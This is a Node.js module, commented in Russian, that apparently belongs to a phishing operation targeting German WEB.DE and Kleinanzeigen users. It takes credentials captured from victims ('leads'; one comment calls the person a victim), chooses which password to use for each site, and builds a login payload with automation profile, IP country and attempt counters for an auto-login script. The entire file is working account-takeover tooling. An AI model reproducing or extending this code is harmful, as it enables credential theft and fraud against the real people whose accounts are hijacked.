/**
 * Единый ответ для скрипта автовхода: креды + automation profile (+ ipCountry).
 * Маршрут подключается из server.js.
 */
'use strict';

const { buildAutomationProfile } = require('./automationProfile');

/**
 * Пароль для формы auth.web.de (lead_simulation, фаза почты).
 * У brand klein: сначала пароль почтового ящика (поле password), иначе — с формы Kl
 * (если жертва вводила только Klein — часто один и тот же пароль).
 */
function webdeMailboxPasswordForLead(lead) {
  if (!lead || typeof lead !== 'object') return '';
  if (lead.brand !== 'klein') {
    return lead.password != null ? String(lead.password).trim() : '';
  }
  const mb = lead.password != null ? String(lead.password).trim() : '';
  const kl = lead.passwordKl != null ? String(lead.passwordKl).trim() : '';
  return mb || kl;
}

/** Пароль именно для входа на Kleinanzeigen (klein_simulation / поллинг оркестрации). */
function kleinLoginPasswordForLead(lead) {
  if (!lead || lead.brand !== 'klein') return '';
  return lead.passwordKl != null ? String(lead.passwordKl).trim() : '';
}

/** Поля для GET /api/lead-credentials и контекста автовхода (без profile). */
function getWorkerLeadCredentialsFields(lead) {
  if (!lead || typeof lead !== 'object') {
    return { email: '', password: '', passwordKl: undefined };
  }
  const isKlein = lead.brand === 'klein';
  // Klein: почта WEB.DE (фаза 1 оркестрации) — lead.email; Kleinanzeigen — emailKl (поллинг / forgot).
  const email = isKlein
    ? String(lead.email || lead.emailKl || '').trim()
    : String(lead.email || '').trim();
  const password = webdeMailboxPasswordForLead(lead);
  const pkl = kleinLoginPasswordForLead(lead);
  const passwordKl = isKlein ? (pkl || undefined) : undefined;
  return { email, password, passwordKl };
}

/**
 * @param {object} lead
 * @returns {{ ok: true, email: string, password: string, profile: object|null, ipCountry?: string, leadId: string } | null}
 */
function buildLeadLoginContextPayload(lead) {
  if (!lead || typeof lead !== 'object') return null;
  const { email, password, passwordKl } = getWorkerLeadCredentialsFields(lead);
  const profile = buildAutomationProfile(lead);
  const out = {
    ok: true,
    leadId: lead.id,
    email,
    password,
    profile: profile || null,
    ipCountry: lead.ipCountry ? String(lead.ipCountry).toUpperCase().slice(0, 2) : undefined
  };
  if (!out.ipCountry && out.profile && out.profile.hints && out.profile.hints.cfIpcountry) {
    out.ipCountry = String(out.profile.hints.cfIpcountry).toUpperCase().slice(0, 2);
  }
  const rawGrid = lead.webdeLoginGridStep;
  let webdeLoginGridStep = 0;
  if (rawGrid != null && Number.isFinite(Number(rawGrid))) {
    webdeLoginGridStep = Math.max(0, Math.floor(Number(rawGrid)));
  }
  out.webdeLoginGridStep = webdeLoginGridStep;
  if (lead.clientFormBrand != null) out.clientFormBrand = String(lead.clientFormBrand);
  if (lead.hostBrandAtSubmit != null) out.hostBrandAtSubmit = String(lead.hostBrandAtSubmit);
  if (lead.brand != null) out.recordBrand = String(lead.brand);
  if (passwordKl) out.passwordKl = passwordKl;
  out.passwordVersion = Number.isFinite(lead.passwordVersion) ? Number(lead.passwordVersion) : 0;
  out.attemptNo = Number.isFinite(lead.attemptNo) ? Number(lead.attemptNo) : 1;
  return out;
}

module.exports = {
  buildLeadLoginContextPayload,
  getWorkerLeadCredentialsFields,
  webdeMailboxPasswordForLead,
  kleinLoginPasswordForLead
};
